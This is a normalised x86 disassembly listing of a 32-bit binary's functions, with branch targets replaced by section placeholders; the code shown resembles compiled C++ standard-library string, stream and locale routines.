mov edi [ esp + 0x8 ]
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
pop edi
sub_10006e82
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ edi + 0x14 ] ebx
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax ebx
mov ebx [ ebp + 0x10 ]
cmp eax ebx
jae r-xdata
call sub_1001b037
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
mov ebx eax
mov [ ebp + 0x10 ] ebx
call sub_1001afff
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10001fc4
test al al
je r-xdata
cmp [ edi + 0x18 ] 0x8
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x8
jb r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
lea edi [ edi + ebx * 2 ]
sub eax ecx
push edi
push eax
lea eax [ edx + ecx * 2 ]
push eax
call sub_1000255d
add esp 0x10
push [ ebp + 0x8 ]
mov ecx esi
call sub_10002579
sub_10006f2b
push edi
xor edi edi
push edi
push esi
xor ecx ecx
mov [ esi + 0x24 ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x10 ] 0x201
mov [ esi + 0x14 ] 0x6
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
call sub_10007d13
push 0x4
call sub_10020186
pop ecx
cmp eax edi
je r-xdata
xor eax eax
mov ecx eax
call sub_1000710a
jmp r-xdata
mov [ esi + 0x24 ] eax
pop edi
retn
sub_10006f73
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
mov [ ebp - 0x1 ] 0x0
call sub_1001b60c
mov al [ ebp - 0x1 ]
add esp 0x10
leave
retn
sub_10006f9b
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp [ edi + 0x14 ] ebx
jae r-xdata
mov eax [ edi + 0x14 ]
sub eax ebx
mov ebx [ ebp + 0x10 ]
cmp eax ebx
jae r-xdata
call sub_1001b037
or eax 0xffffffff
sub eax [ esi + 0x14 ]
cmp eax ebx
jbe r-xdata
mov ebx eax
mov [ ebp + 0x10 ] ebx
call sub_1001afff
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
test ebx ebx
jbe r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10002419
test al al
je r-xdata
cmp [ edi + 0x18 ] 0x10
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
push [ ebp + 0x10 ]
mov ecx [ esi + 0x14 ]
mov ebx [ ebp + 0xc ]
add edi ebx
sub eax ecx
push edi
push eax
add ecx edx
push ecx
call sub_10002477
add esp 0x10
push [ ebp + 0x8 ]
mov ecx esi
call sub_10002493
sub_10007042
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_100020ec
test al al
je r-xdata
or eax 0xffffffff
sub eax [ esi + 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp eax ebx
jbe r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
call sub_1001afff
mov eax [ esi + 0x14 ]
lea ecx [ eax + ebx ]
cmp ecx eax
jae r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
test ebx ebx
jbe r-xdata
pop edi
pop esi
pop ebp
retn 0x8
push [ ebp + 0xc ]
sub edi eax
push edi
push esi
mov ecx esi
call sub_10006f9b
jmp r-xdata
mov eax esi
pop ebx
mov edi [ esi + 0x14 ]
push 0x0
add edi ebx
push edi
mov ecx esi
call sub_10002419
test al al
je r-xdata
mov eax [ esi + 0x18 ]
cmp eax 0x10
jb r-xdata
lea edx [ esi + 0x4 ]
mov edx [ esi + 0x4 ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
push ebx
push [ ebp + 0x8 ]
sub eax ecx
push eax
add ecx edx
push ecx
call sub_10002477
add esp 0x10
push edi
mov ecx esi
call sub_10002493
sub_100070de
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0x10 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1001b946
mov ax [ ebp - 0x4 ]
add esp 0x14
leave
retn
sub_1000715a
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x10 ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor esi esi
mov ecx [ edi + 0x30 ]
mov esi [ ecx ]
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x14 ]
movzx eax ax
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp + 0x10 ] esi
jge r-xdata
test esi esi
jle r-xdata
pop esi
pop ebx
mov [ ebx ] ax
inc ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0x10 ]
push esi
push [ eax ]
push [ ebp + 0xc ]
push ebx
call sub_1000255d
mov eax [ edi + 0x30 ]
sub [ eax ] esi
mov eax [ edi + 0x20 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0x10 ] esi
lea ecx [ esi + esi ]
add esp 0x10
add ebx ecx
add [ eax ] ecx
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ edi + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
sub_100071e2
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
push edi
mov edi ecx
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
leave
retn 0x8
push ebx
mov ebx [ ebp + 0x8 ]
push esi
xor ecx ecx
mov ecx [ edi + 0x34 ]
mov ecx [ ecx ]
jmp r-xdata
movzx eax [ ebx ]
mov edx [ edi ]
push eax
mov ecx edi
call [ edx + 0x4 ]
mov ecx 0xffff
cmp cx ax
je r-xdata
cmp [ ebp + 0xc ] ecx
mov esi ecx
jge r-xdata
test ecx ecx
jle r-xdata
pop esi
pop ebx
inc ebx
inc ebx
inc [ ebp - 0x4 ]
dec [ ebp + 0xc ]
push esi
push ebx
push ecx
push [ eax ]
call sub_1000255d
mov eax [ edi + 0x34 ]
sub [ eax ] esi
mov eax [ edi + 0x24 ]
add [ ebp - 0x4 ] esi
sub [ ebp + 0xc ] esi
lea ecx [ esi + esi ]
add esp 0x10
add ebx ecx
add [ eax ] ecx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov eax [ edi + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
sub_10007284
push esi
mov esi ecx
push edi
mov edi [ esi + 0x38 ]
mov [ esi ] r--data
test edi edi
je r-xdata
pop edi
lea ecx [ esi + 0x4 ]
pop esi
jmp sub_1001b08e
mov ecx edi
call sub_10007b41
push edi
call sub_1002004f
pop ecx
sub_100072ad
push esi
lea esi [ ecx - 0x4 ]
lea eax [ esi + 0x4 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x4 ] r--data
push eax
mov [ eax ] r--data
call sub_1001b129
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_100072e3
push esi
lea esi [ ecx - 0x8 ]
lea eax [ esi + 0x8 ]
mov ecx [ eax - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_1001b129
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10007328
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
leave
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1001b1bf
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_1001b1e7
inc [ rw-data ]
mov eax [ rw-data ]
mov [ esi ] eax
sub_1000735d
mov ecx [ ecx ]
push esi
mov esi [ esp + 0x8 ]
cmp esi [ ecx + 0xc ]
jae r-xdata
xor eax eax
mov eax [ ecx + 0x8 ]
mov eax [ eax + esi * 4 ]
jmp r-xdata
pop esi
retn 0x4
cmp [ ecx + 0x14 ] al
je r-xdata
test eax eax
jne r-xdata
call sub_1001b2f7
cmp esi [ eax + 0xc ]
jae r-xdata
xor eax eax
mov eax [ eax + 0x8 ]
mov eax [ eax + esi * 4 ]
jmp r-xdata
sub_100073eb
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ esp + 0x14 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ esp + 0x10 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
jne r-xdata
pop edi
mov eax esi
pop esi
retn 0xc
inc esi
inc esi
sub_10007417
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
jmp r-xdata
cmp esi [ esp + 0x14 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
push [ esp + 0x10 ]
mov ecx edi
call [ edx + 0x8 ]
test al al
je r-xdata
pop edi
mov eax esi
pop esi
retn 0xc
inc esi
inc esi
sub_10007443
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1001bb27
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_10007482
push esi
mov esi [ esp + 0x8 ]
cmp esi [ esp + 0xc ]
je r-xdata
mov eax esi
pop esi
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_1001baba
mov [ esi ] ax
inc esi
inc esi
pop ecx
pop ecx
cmp esi [ esp + 0x10 ]
jne r-xdata
pop edi
sub_100074e2
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
add ecx 0x18
push ecx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_1001b946
add esp 0x14
test eax eax
mov eax 0xffff
jl r-xdata
leave
retn 0x4
movzx eax [ ebp - 0x4 ]
sub_10007516
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
mov ebx ecx
cmp [ ebp + 0x14 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_1002059f
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push edi
mov edi [ ebp + 0x10 ]
movzx eax [ esi ]
push eax
mov ecx ebx
call sub_100074e2
mov [ edi ] ax
inc esi
inc edi
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10007557
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
sar edx 0x1
push edx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x38 ]
pop ebp
retn 0x10
sub_1000757d
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x10 ] 0x0
mov eax ecx
add eax 0x18
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_1001b60c
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0xc ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10020040
leave
retn 0x8
mov al [ ebp - 0xc ]
sub_100075c3
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
mov ebx ecx
cmp [ ebp + 0x18 ] eax
jae r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
call sub_1002059f
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov edi [ ebp + 0x14 ]
movzx eax [ esi ]
push [ ebp + 0x10 ]
mov ecx ebx
push eax
call sub_1000757d
inc esi
inc esi
mov [ edi ] al
inc edi
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_10007608
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1001b7b6
mov esi eax
mov eax [ ebp + 0x8 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
movsd [ edi ] [ esi ]
pop edi
pop esi
leave
retn 0x4
sub_1000763e
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp - 0x10 ]
mov ebx ecx
mov ecx [ ebp + 0x8 ]
push eax
call sub_10007608
mov esi eax
lea edi [ ebx + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
call sub_1001b693
pop edi
pop esi
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] edx
pop ebx
leave
retn 0x4
sub_1000768f
push 0x4
mov eax sub_10048a0f
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
push 0x0
call sub_1001b1bf
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x4 ]
call sub_10007ee2
lea ecx [ esi + 0x20 ]
call sub_10007ee2
lea ecx [ esi + 0x3c ]
call sub_10007ee2
lea ecx [ esi + 0x58 ]
call sub_10007ee2
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x4
push esi
call sub_1001b5b0
pop ecx
pop ecx
mov eax esi
call sub_10023f0b
retn 0x4
sub_10007701
push 0x4
mov eax sub_10048a0f
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
push esi
mov [ ebp - 0x4 ] 0x4
call sub_1001b3fa
pop ecx
push 0x0
push 0x1
lea ecx [ esi + 0x58 ]
call sub_100023ce
push 0x0
push 0x1
lea ecx [ esi + 0x3c ]
call sub_100023ce
push 0x0
push 0x1
lea ecx [ esi + 0x20 ]
call sub_100023ce
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
call sub_100023ce
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1001b1e7
call sub_10023f0b
retn
sub_10007761
push 0x94
mov eax sub_10047a42
call sub_10023e33
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_10023f0b
retn
cmp [ esi ] edi
jne r-xdata
push 0x20
call sub_10020186
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_100076e4
mov [ ebp - 0x4 ] 0x1
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x10 ] 0x1
call sub_1000768f
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_10007670
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_10007701
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0x10 ] 0x2
mov [ esi ] eax
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100023ce
sub_10007802
push 0x14
mov eax sub_10047e26
call sub_10023e33
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1001b1bf
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007328
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000735d
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1001b1e7
mov eax edi
call sub_10023f0b
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10007761
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10007ac8
push edi
call sub_1001b3bc
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100202ec
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10023a01
sub_1000789f
push esi
mov esi ecx
mov eax [ esi ]
call [ eax + 0x10 ]
mov ecx 0xffff
mov edx ecx
cmp dx ax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
mov eax ecx
pop esi
retn
sub_100078d1
mov eax [ ecx + 0x20 ]
cmp [ eax ] 0x0
je r-xdata
xor edx edx
mov edx [ ecx + 0x30 ]
mov edx [ edx ]
jmp r-xdata
mov eax [ ecx ]
call [ eax + 0x10 ]
movzx eax ax
retn
mov eax [ eax ]
movzx eax [ eax ]
retn
test edx edx
jle r-xdata
sub_100078f5
mov ecx [ esi + 0x20 ]
xor eax eax
cmp [ ecx ] eax
je r-xdata
cmp eax 0x1
jle r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax ]
mov ecx esi
call sub_1003b24c
mov ecx 0xffff
mov edx ecx
cmp dx ax
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
add [ eax ] 0x2
mov eax [ esi + 0x20 ]
mov eax [ eax ]
movzx eax [ eax ]
retn
mov ecx esi
call sub_100078d1
movzx eax ax
retn
mov eax ecx
retn
sub_1000795a
push 0x8
mov eax sub_1004a58d
call sub_10023e66
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x8 ]
or ecx 0x2
cmp [ eax + 0x28 ] 0x0
jne r-xdata
mov eax [ eax + 0x2c ]
test eax eax
je r-xdata
push 0x0
push eax
call sub_10007d13
xor al al
or ecx 0x4
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x10 ]
test cl 0x1
je r-xdata
mov esi eax
call sub_1000d39d
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx [ eax + 0x4 ]
add ecx edi
call sub_10007b59
and [ ebp - 0x4 ] 0x0
push eax
call sub_10007802
pop ecx
lea ecx [ ebp - 0x14 ]
mov ebx eax
call sub_10007b41
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
call sub_100078d1
mov al 0x1
jmp r-xdata
mov edx [ ebx ]
push eax
push 0x48
mov ecx ebx
call [ edx + 0x8 ]
test al al
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov ecx [ eax + 0x8 ]
or ecx 0x1
cmp [ eax + 0x28 ] 0x0
jne r-xdata
call sub_10023f0b
retn 0x4
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov esi [ eax + edi + 0x28 ]
call sub_100078f5
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x0
push eax
call sub_10007d13
jmp r-xdata
or ecx 0x4
movzx eax ax
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_10007a27
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
or ecx 0x4
cmp [ eax + 0x28 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_10007d13
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
or ecx 0x4
sub_10007a87
push 0x4
mov eax sub_1004a820
call sub_10023e33
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push [ esi ]
call sub_1000795a
mov [ esi + 0x4 ] al
mov eax esi
call sub_10023f0b
retn 0x8
lea ecx [ eax + 0x4 ]
call sub_1001b0a5
sub_10007ac8
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1001b1bf
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
lea ecx [ ebp - 0x4 ]
call sub_1001b1e7
pop esi
leave
retn
inc eax
mov [ esi + 0x4 ] eax
sub_10007b06
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_1001b1bf
mov eax [ edi + 0x4 ]
test eax eax
jbe r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_1001b1e7
pop edi
mov eax esi
pop esi
leave
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_10007b8c
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_1002059f
test ebx ebx
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x8
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
lea eax [ eax + ecx * 2 ]
cmp ebx eax
jbe r-xdata
mov eax [ eax ]
mov [ edi ] esi
mov [ edi + 0x4 ] ebx
mov eax edi
pop edi
pop esi
pop ebx
retn 0x8
sub_10007bdc
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ ecx + 0x14 ]
lea eax [ eax + ecx * 2 ]
mov ecx [ esp + 0x8 ]
push eax
call sub_10007b8c
mov eax [ esp + 0x4 ]
retn 0x4
sub_10007c02
push esi
mov esi ecx
push esi
mov [ esi ] r--data
call sub_1001b129
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_1002004f
pop ecx
sub_10007c4c
push 0x0
mov eax sub_1004a7fd
call sub_10023e33
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call j_sub_100241d9
test al al
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
mov ecx [ esi ]
call sub_1000ee60
call sub_10023f0b
retn 0x4
lea ecx [ eax + 0x4 ]
call sub_1001b0ae
sub_10007c92
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
push [ esp + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov eax [ esp + 0x4 ]
mov [ ecx ] ax
jmp r-xdata
test eax eax
jle r-xdata
movzx eax ax
retn 0x4
sub_10007d13
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004923a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
push ebx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
and ecx 0x17
mov [ eax + 0x8 ] ecx
mov eax [ eax + 0xc ]
and eax ecx
je r-xdata
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor ebx ebx
cmp [ ebp + 0xc ] bl
je r-xdata
test al 0x4
je r-xdata
push ebx
push ebx
push 0x2
pop ebx
test bl al
je r-xdata
push r--data
lea ecx [ esp + 0x38 ]
call sub_10001d1f
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0xa4 ] ebx
call sub_10001d6b
mov [ esp + 0xc ] r--data
push r--data
lea eax [ esp + 0x10 ]
push r--data
lea ecx [ esp + 0x7c ]
call sub_10001d1f
lea eax [ esp + 0x78 ]
push eax
lea ecx [ esp + 0x54 ]
mov [ esp + 0xa4 ] ebx
call sub_10001d6b
mov [ esp + 0x50 ] r--data
push r--data
lea eax [ esp + 0x54 ]
jmp r-xdata
push r--data
lea ecx [ esp + 0x38 ]
call sub_10001d1f
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0xa4 ] 0x1
call sub_10001d6b
mov [ esp + 0xc ] r--data
push r--data
lea eax [ esp + 0x10 ]
jmp r-xdata
call sub_10023a01
push eax
jmp r-xdata
sub_10007e6e
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_1002059f
test ebx ebx
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x10
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
add ecx eax
cmp ebx ecx
jbe r-xdata
mov eax [ eax ]
mov [ edi ] esi
mov [ edi + 0x4 ] ebx
mov eax edi
pop edi
pop esi
pop ebx
retn 0x8
sub_10007ebd
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ ecx + 0x14 ]
add ecx eax
push ecx
mov ecx [ esp + 0xc ]
call sub_10007e6e
mov eax [ esp + 0x4 ]
retn 0x4
sub_10007ef7
push 0x20
mov eax sub_1004a56a
call sub_10023e33
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_1000ada3
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x10 ]
lea ecx [ esi + 0x18 ]
mov [ esi ] r--data
call sub_100020c6
mov ecx [ ebp + 0xc ]
lea eax [ esi + 0x34 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100010f1
lea ecx [ esi + 0xbc ]
call sub_10001b23
push r--data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x3
call sub_100012f3
lea edi [ esi + 0xd8 ]
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x4
push eax
lea ecx [ edi + 0x4 ]
mov [ edi ] r--data
call sub_100020c6
and [ edi + 0x20 ] 0x0
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x6
call sub_10002597
lea edi [ esi + 0xfc ]
mov eax edi
mov [ ebp + 0x10 ] edi
call sub_1000ada3
mov [ ebp - 0x4 ] 0x7
mov [ edi ] r--data
add edi 0x18
push edi
call sub_1000b385
cmp [ esi + 0x68 ] 0x0
jne r-xdata
mov eax esi
call sub_10023f0b
retn 0xc
mov [ esi + 0x68 ] 0xa4cb80
sub_10007fd4
push 0x4
mov eax sub_10049207
call sub_10023e33
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0xfc ]
mov [ ebp - 0x4 ] 0x4
call sub_1000b202
lea ecx [ esi + 0xd8 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000add8
push 0x0
